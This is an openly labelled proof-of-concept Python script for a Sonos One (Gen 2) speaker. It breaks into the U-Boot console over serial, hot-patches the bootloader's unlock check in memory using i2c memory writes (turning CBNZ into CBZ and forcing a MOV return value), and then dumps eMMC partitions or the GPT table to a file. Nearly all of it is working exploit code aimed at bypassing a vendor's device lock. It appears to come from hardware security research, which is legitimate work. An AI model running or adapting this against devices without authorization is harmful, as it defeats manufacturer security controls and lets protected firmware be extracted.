'''
This script will attempt to dump the data from the given partition - defined by
first LBA and last LBA - from a Sonos One (Generation 2) [S18]. In the event
that no LBA range is provided, the GPT partition list will be dumped to the
terminal instead.

This will automatically hot patch U-Boot in order to enable the 'privileged'
command set, which is usually restricted to device which have been 'unlocked'.
After this has been done, the relevant data will be read from MMC 0 using the
built in U-Boot `mmc read` and `md` commands.

Oh, by the way: This code is awful, it's PoC grade at best :)

Author: Peter Adkins (@Darkarnium)
'''

import re
import sys
import struct
import serial
import pathlib
import datetime

PROMPT = 'sonos tupelo >'


def unit_to_uboot():
    '''
    Attempt to use a serial console to bring the Unit into a clean U-Boot
    prompt at power on, or reset and re-enter U-Boot if already at a U-Boot
    prompt.
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=10) as interface:
        # First up, reset the unit to get into a clean state.
        print('[+] Attempting to issue reset command to U-Boot')
        interface.write(b'reset\n')

        # Drop back into U-Boot.
        print('[-] Waiting for U-Boot boot interrupt prompt')
        buffer = bytes()
        while True:
            buffer += interface.readline()

            try:
                line = str(buffer, 'utf-8')
            except UnicodeDecodeError as err:
                buffer = bytes()
                continue

            # The whitelist check is just prior to the U-Boot interupt prompt.
            # When this line is encountered start reading N bytes rather than
            # until EoL - as the count down does not print an \n character
            # until AFTER the timeout.
            if line.lower().startswith('whitelist check completed'):
                # Check whether the 'Hit any key' prompt follows.
                try:
                    peek = interface.read(12)
                    if str(peek, 'utf-8').lower().startswith('hit any key'):
                        print('[+] Writing U-Boot interrupt to console')
                        interface.write(b'A')
                        buffer = bytes()
                        continue
                    else:
                        buffer += peek
                except:
                    # No point in tracking the read bytes if they'll just be
                    # discarded at the top of the next iteration.
                    pass

            # Drop out of the loop when we see the U-Boot prompt
            if line.lower().startswith(PROMPT):
                print('[-] Unit is now at U-Boot prompt')
                buffer = bytes()
                break

            # Dump the buffer contents if no matches.
            buffer = bytes()


def write_to_memory(value, addr, device=0x30, register=0x70):
    '''
    Attempt to write the given value (byte) into memory at the given address.

    Args:
        value (int): The value to write.
        addr (int): The address in memory to write to.
        device (int): The address of the device on the i2c bus to read from
        register (int): The address of the register to use as a buffer

    Return:
        Whether the read operation was successful (bool).
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=5) as interface:
        command = 'i2c mw 0x{0:0x} 0x{1:0x} 0x{2:0x}\n'.format(
            device,
            register,
            value
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        # Attempt to read from the register into memory.
        command = 'i2c read 0x{0:0x} 0x{1:0x} 0x01 0x{2:0x}\n'.format(
            device,
            register,
            addr
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()
        status = str(interface.read(len(PROMPT)), 'utf-8')

        # Abort if the write failed.
        if not status.lower().startswith(PROMPT):
            print('[!] Write failed: {0}'.format(status))
            return False

        return True


def read_from_mmc(addr=0x300000, start=0x3200, end=0x3201):
    '''
    Attempts to read data from the MMC into memory, and then out of memory to
    the terminal.

    Args:
        addr (int): The address to read to in memory.
        start (int): The block to start reading from (LBA).
        end (int): The block to stop reading at (LBA).

    Return:
        Data from MMC.
    '''
    with serial.Serial('/dev/ttyUSB0', 115200, timeout=1) as interface:
        command = 'mmc read 0x{0:0x} 0x{1:0x} 0x{2:0x}\n'.format(
            addr,
            start,
            (end - start),  # Size in blocks.
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()

        # The next line is a blank new line.
        interface.readline()
        status = str(interface.readline(), 'utf-8').strip()

        # Abort if the write failed.
        if not re.match('^MMC.*OK$', status):
            print('[!] Read failed: {0}'.format(status))
            return False

        # Read from memory.
        command = 'md.b 0x{0:0x} 0x{1:0x}\n'.format(
            addr,
            (end - start) * 512,  # Blocks are 512-bytes.
        )
        interface.write(bytes(command, 'utf-8'))

        # Loop back is enabled, so throw away the first line.
        interface.readline()

        # Keep reading until all bytes have been read.
        kernel = bytearray()
        buffer = str(interface.readline(), 'utf-8')
        while re.match('^[0-9A-Za-z]{8}:', buffer):
            for byte in buffer.split(' ')[1:17]:
                kernel.append(int(byte, 16))

            # Read more.
            buffer = str(interface.readline(), 'utf-8')

        if len(kernel) > 0:
            return kernel
        else:
            return None


def unlock_uboot():
    '''
    Attempt to 'unlock' U-Boot by patching the return value from the procedure
    responsible for validating whether the device is marked as unlocked. This
    will only 'unlock' U-Boot, as there are additional checks in Linux.

    Return:
        Whether the unlock operation was successful.
    '''
    # Patch `CBNZ` to `CBZ`.
    addr = base + (0x100CD17 - 0x01000000)
    print('[+] Patching CBNZ to CBZ at 0x{0:0x}'.format(addr))
    if not write_to_memory(0x34, addr):
        return False

    # Patch `MOV W0, #0` to `MOV W0, #1`.
    addr = base + (0x100CDAC - 0x01000000)
    print('[+] Patching MOV at 0x{0:0x}'.format(addr))
    if not write_to_memory(0x20, addr):
        return False

    return True


def cli_usage():
    '''
    Prints the command line usage to the terminal.
    '''
    print('Usage: dump-from-mmc.py [<output> <lba-start> <lba-end>]')


if __name__ == '__main__':
    if len(sys.argv) > 4:
        cli_usage()
        sys.exit(-1)
    if len(sys.argv) > 1 and len(sys.argv) < 4:
        cli_usage()
        print(
            'Output file, LBA start, and LBA end must be provided! ' +
            'One cannot be specified without the others'
        )
        sys.exit(-1)

    # Addresses for locating the unlock procedures in memory.
    load = 0x01000000
    base = 0x3ff21000

    # Resolve the path for the output file.
    if len(sys.argv) > 1 and sys.argv[1]:
        output = pathlib.Path(sys.argv[1]).expanduser().resolve()
    else:
        output = None

    try:
        lba_start = int(sys.argv[2], 16) if len(sys.argv) > 2 else None
        lba_end = int(sys.argv[3], 16) if len(sys.argv) > 3 else None
    except ValueError as err:
        print(
            '[!] Cannot cast input LBA ranges to int from hex: {0}'.format(err)
        )

    # Reset to a clean state first.
    start_time = datetime.datetime.utcnow()
    unit_to_uboot()

    # 'Unlock' U-boot.
    if not unlock_uboot():
        print('[!] Failed to unlock U-Boot, cannot continue')
        sys.exit(-2)

    # If no range was provided, dump the GPT patition list instead.
    if not lba_start:
        data = read_from_mmc(start=0x3002, end=0x3035)
        if not data:
            print('[!] Failed to dump data from MMC, cannot continue')
            sys.exit(-3)

        part_s = 0x0
        part_c = part_s
        part_sz = 0x80
        while part_c < len(data):
            (part_lba_s, part_lba_e, part_name) = struct.unpack(
                '<32xQQ8x72s',
                data[part_s:part_s+part_sz]
            )
            part_s += part_sz

            # Skip empty.
            if part_lba_s == 0:
                break

            # Fix up name / NULLs.
            part_name = part_name.replace(b'\x00', b'')
            print(
                '[+] LBA 0x{1:08x} to 0x{2:08x} is name "{0}"'.format(
                    str(part_name, 'utf-8'),
                    part_lba_s,
                    part_lba_e,
                )
            )
    else:
        # Attempt to read the data from MMC.
        data = read_from_mmc(start=lba_start, end=lba_end)
        if not data:
            print('[!] Failed to dump data from MMC, cannot continue')
            sys.exit(-3)

        print('[+] Got data, writing to file at {0}'.format(output))
        try:
            with open(output, 'wb') as fout:
                fout.write(data)
        except IOError as err:
            print('[!] Could not write to file: {0}'.format(err))
            sys.exit(-4)

    end_time = datetime.datetime.utcnow()
    print('[-] Complete in {0}\n'.format(end_time - start_time))
